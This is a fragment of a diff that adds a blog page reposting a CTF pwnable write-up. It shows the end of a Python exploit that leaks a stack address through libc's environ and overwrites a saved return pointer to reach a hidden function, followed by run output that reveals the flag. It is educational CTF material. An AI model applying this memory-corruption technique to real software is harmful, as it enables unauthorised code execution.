+print(f&#34;libc base  : 0x{libc.address:2x}&#34;)
+print(f&#34;environ libc: 0x{libc.sym.environ:2x}&#34;)
+
+# leak stack address via environ pointer in libc
+d = recycle(5)
+r.sendline(str(libc.sym.environ))
+environ_stack = int.from_bytes(r.recvline()[-7:-1], &#34;little&#34;)
+print(f&#34;environ stack: 0x{environ_stack:2x}&#34;)
+
+# get plant()&#39;s saved return pointer by subtracting 288 bytes from environ
+plant_retptr = environ_stack - 288
+print(f&#34;plant() saved return pointer: 0x{plant_retptr:2x}&#34;)
+
+# overwrite plant()&#39;s saved return pointer with hidden_resources()
+plant(plant_retptr, elf.sym.hidden_resources)
+</code></pre><p>And here it is retrieving the flag:</p>
+<pre tabindex="0"><code>► ./sploit.py SILENT=1
+printf@libc: 0x7f85ab613f70
+libc base  : 0x7f85ab5af000
+environ libc: 0x7f85ab99d098
+environ stack: 0x7fffeb322988
+plant() saved return pointer: 0x7fffeb322868
+b&#39;\n\x1b[1;32765;32mWhere do you want to plant?\n1. City\n2. Forest\n\x1b[0m&gt; Thanks a lot for your contribution!\nYou found a hidden vault with resources. You are very lucky!\nCHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}\n&#39;
+</code></pre><h4 id="source"><a href="http://blog.techorganic.com/2021/04/26/cyber-apocalypse-ctf-2021-pwnables/">Source</a></h4>
+<!-- raw HTML omitted -->
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-laser-harp-sets-the-tone/">Laser Harp Sets the Tone</a></li>
+				
+				<li><a href="/posts/2025-03-20-arduino-device-helps-split-the-g-on-a-p/">Arduino device helps split the G on a pint of Guinness</a></li>
+				
+				<li><a href="/posts/2025-03-20-the-70-best-early-amazon-spring-sale-ga/">The 70 best early Amazon Spring Sale gaming deals 2025</a></li>
+				
+				<li><a href="/posts/2025-03-20-tomorrow-and-tomorrow-and-tomorrow-info/">Tomorrow and tomorrow and tomorrow Information security and the Baseball Hall of Fame</a></li>
+				
+				<li><a href="/posts/2025-03-20-i-found-an-android-phone-that-can-convi/">I found an Android phone that can convince iPhone users to make the switch - and its not a flagship</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
